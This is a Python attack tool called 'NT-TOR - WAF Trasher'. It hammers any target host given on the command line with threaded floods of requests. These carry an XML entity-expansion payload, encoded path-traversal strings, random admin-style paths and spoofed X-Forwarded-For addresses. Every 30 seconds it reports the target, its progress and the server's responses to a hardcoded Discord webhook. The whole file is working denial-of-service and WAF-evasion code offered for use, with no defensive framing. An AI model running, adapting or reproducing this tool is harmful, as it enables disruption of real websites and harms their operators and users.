#!/usr/bin/env python3
"""
NT-TOR - WAF Trasher
STS BASE V1 Logging System
"""

import socket
import ssl
import time
import random
import string
import threading
from datetime import datetime, timezone
from colorama import init, Fore, Style
import requests
import json

init(autoreset=True)

# Colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
CYAN = Fore.CYAN
MAGENTA = Fore.MAGENTA
WHITE = Fore.WHITE
RESET = Style.RESET_ALL

# STS Style
STS = f"{MAGENTA}S.T.S{RESET}"

class NTTOR:
    def __init__(self, target, webhook_url, duration=300):
        self.target = target.replace('https://', '').replace('http://', '').split('/')[0]
        self.webhook_url = webhook_url
        self.duration = duration
        self.running = True
        
        # Stats
        self.h0_requests = 0
        self.h2_requests = 0
        self.data_sent = 0
        self.data_received = 0
        self.last_response_data = "INITIALIZING CONNECTION..."
        self.start_time = datetime.now()
        self.session_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        self.lock = threading.Lock()
        
        # User agents
        self.samsung_uas = [
            "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-S918B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 Chrome/120.0.6099.210 Mobile Safari/537.36",
        ]
        
        self.random_uas = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
        ]
        
        # Random IPs
        self.ips = [f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}" 
                   for _ in range(100)]
        
        # STS variations
        self.sts_variations = [
            "S.T.S", "STS", "S-T-S", "S.T.S.", "S_T_S", 
            "%53.%54.%53", "\\x53\\x54\\x53", "&#83;&#84;&#83;"
        ]
        
        print(f"\n{MAGENTA}{STS} NT-TOR{WHITE} - WAF Trasher [STS BASE V1]{RESET}")
        print(f"Session: {self.session_id}")
        print(f"Target: {target}")
        print(f"Duration: {duration}s")
        print("=" * 60)
        
    def rand_str(self, n=8):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
    
    def format_size(self, size):
        if size < 1024:
            return f"{size}B"
        elif size < 1024**2:
            return f"{size/1024:.2f}KB"
        elif size < 1024**3:
            return f"{size/1024**2:.2f}MB"
        else:
            return f"{size/1024**3:.2f}GB"
    
    def build_h0_payload(self):
        ua = random.choice(self.samsung_uas) if random.randint(1,20) == 1 else random.choice(self.random_uas)
        sts_var = random.choice(self.sts_variations)
        
        xml_bomb = f'''POST / HTTP/1.1
Host: {self.target}
X-Forwarded-Host: :{random.randint(1,9999)}
User-Agent: {ua}
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY sts "{sts_var}"><!ENTITY sts2 "&sts;&sts;&sts;&sts;&sts;&sts;&sts;&sts;&sts;&sts;">]><root>&sts2;</root>'''
        
        return xml_bomb.replace('\n', '\r\n').encode()
    
    def build_h2_payload(self):
        ua = random.choice(self.random_uas)
        ip = random.choice(self.ips)
        
        paths = [f"/wp-admin/{self.rand_str(8)}.php", f"/includes/{self.rand_str(6)}.asp", f"/modules/{self.rand_str(7)}.jsp"]
        path = random.choice(paths)
        
        traversal = '../' * random.randint(3, 8)
        traversal = traversal.replace('../', '%2e%2e%2f')
        
        request = f"GET {path} HTTP/2\r\n"
        request += f"Host: {self.target}\r\n"
        request += f"User-Agent: {ua}\r\n"
        request += f"X-Forwarded-For: {ip}\r\n"
        request += f"Accept: ../../../../../../({self.rand_str(10)})\r\n"
        request += f"Referer: https://{self.target}/{traversal}{self.rand_str(8)}.php?sts={random.choice(self.sts_variations)}\r\n"
        request += "Cache-Control: no-cache\r\n\r\n"
        
        return request.replace('\n', '\r\n').encode()
    
    def send_h0_request(self):
        try:
            payload = self.build_h0_payload()
            
            with self.lock:
                self.data_sent += len(payload)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target, 80))
            sock.send(payload)
            
            try:
                data = sock.recv(8192)
                with self.lock:
                    self.data_received += len(data)
                    if data:
                        # Store full response data
                        try:
                            decoded = data.decode('utf-8', errors='ignore')
                            self.last_response_data = decoded[:500]  # First 500 chars
                        except:
                            self.last_response_data = f"[BINARY DATA: {len(data)} bytes]"
            except:
                pass
            
            sock.close()
            
            with self.lock:
                self.h0_requests += 1
                
        except:
            pass
    
    def send_h2_request(self):
        try:
            payload = self.build_h2_payload()
            
            with self.lock:
                self.data_sent += len(payload)
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_alpn_protocols(['h2', 'http/1.1'])
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock = context.wrap_socket(sock, server_hostname=self.target)
            sock.connect((self.target, 443))
            sock.send(payload)
            
            try:
                data = sock.recv(8192)
                with self.lock:
                    self.data_received += len(data)
                    if data:
                        try:
                            decoded = data.decode('utf-8', errors='ignore')
                            self.last_response_data = decoded[:500]
                        except:
                            self.last_response_data = f"[BINARY DATA: {len(data)} bytes]"
            except:
                pass
            
            sock.close()
            
            with self.lock:
                self.h2_requests += 1
                
        except:
            pass
    
    def send_discord_update(self):
        """Send scary Discord update (no emojis, pure text)"""
        runtime = str(datetime.now() - self.start_time).split('.')[0]
        total_reqs = self.h0_requests + self.h2_requests
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        embed = {
            "title": f"⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
            "color": 0x4a0e4a,  # Dark purple
            "fields": [
                {
                    "name": "S.T.S NT-TOR",
                    "value": f"```Session: {self.session_id}```",
                    "inline": False
                },
                {
                    "name": f"({current_time}) [LIVE UPDATE]",
                    "value": "⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯",
                    "inline": False
                },
                {
                    "name": "TARGET",
                    "value": f"```{self.target}```",
                    "inline": False
                },
                {
                    "name": "T-R-S",
                    "value": f"```{total_reqs}```",
                    "inline": True
                },
                {
                    "name": "T-D-R",
                    "value": f"```{self.format_size(self.data_received)}```",
                    "inline": True
                },
                {
                    "name": "T-D-S",
                    "value": f"```{self.format_size(self.data_sent)}```",
                    "inline": True
                },
                {
                    "name": "RUNTIME",
                    "value": f"```{runtime}```",
                    "inline": False
                },
                {
                    "name": "LAST RESPONSE",
                    "value": f"```{self.last_response_data[:500]}```",
                    "inline": False
                }
            ],
            "footer": {"text": "STS BASE V1 • NT-TOR"}
        }
        
        try:
            requests.post(self.webhook_url, json={"embeds": [embed]})
            print(f"{MAGENTA}[DISCORD] Update sent{RESET}")
        except Exception as e:
            print(f"{RED}[DISCORD] Failed: {e}{RESET}")
    
    def h0_engine(self):
        while self.running:
            for _ in range(250):
                if not self.running: break
                self.send_h0_request()
                time.sleep(random.uniform(0.008, 0.028))
            if self.running:
                time.sleep(random.uniform(2, 7))
    
    def h2_engine(self):
        while self.running:
            for _ in range(500):
                if not self.running: break
                self.send_h2_request()
                time.sleep(random.uniform(0.002, 0.004))
            if self.running:
                time.sleep(random.uniform(1, 2))
    
    def monitor(self):
        """Terminal logging - STS BASE V1"""
        last_h0 = 0
        last_h2 = 0
        last_discord = 0
        
        while self.running:
            time.sleep(1)
            elapsed = (datetime.now() - self.start_time).seconds
            
            h0_rps = self.h0_requests - last_h0
            h2_rps = self.h2_requests - last_h2
            last_h0 = self.h0_requests
            last_h2 = self.h2_requests
            total = self.h0_requests + self.h2_requests
            
            # Terminal - STS BASE V1 format
            print(f"\r{MAGENTA}#NT-TOR{RESET} | "
                  f"H0:{self.h0_requests} | "
                  f"H2:{self.h2_requests} | "
                  f"TOT:{total} | "
                  f"↑{self.format_size(self.data_sent)} | "
                  f"↓{self.format_size(self.data_received)}", 
                  end='', flush=True)
            
            # Discord update every 30 seconds (not spam)
            if elapsed - last_discord >= 30:
                self.send_discord_update()
                last_discord = elapsed
            
            if elapsed >= self.duration:
                self.running = False
                break
    
    def start(self):
        # Start engines
        threading.Thread(target=self.h0_engine, daemon=True).start()
        threading.Thread(target=self.h2_engine, daemon=True).start()
        threading.Thread(target=self.monitor, daemon=True).start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
        
        # Final stats
        elapsed = (datetime.now() - self.start_time).seconds
        total = self.h0_requests + self.h2_requests
        
        print(f"\n\n{MAGENTA}⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯{RESET}")
        print(f"S.T.S NT-TOR - SESSION TERMINATED")
        print(f"Session: {self.session_id}")
        print(f"Target: {self.target}")
        print(f"Total Requests: {total}")
        print(f"Data Sent: {self.format_size(self.data_sent)}")
        print(f"Data Received: {self.format_size(self.data_received)}")
        print(f"Duration: {elapsed}s")
        
        # Final Discord update
        self.send_discord_update()

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python nt-tor.py <target> [duration]")
        print("Example: python nt-tor.py example.com 300")
        sys.exit(1)
    
    webhook = "https://discord.com/api/webhooks/1478989089045876779/fDm39Cls5AfZ0gZJM0sbhtJt59jo3i1Oy2_aHO3GmmSUw3gdg4pDfH7niEiXiA18ZJsM"
    target = sys.argv[1]
    duration = int(sys.argv[2]) if len(sys.argv) > 2 else 300
    
    nt = NTTOR(target, webhook, duration)
    nt.start()
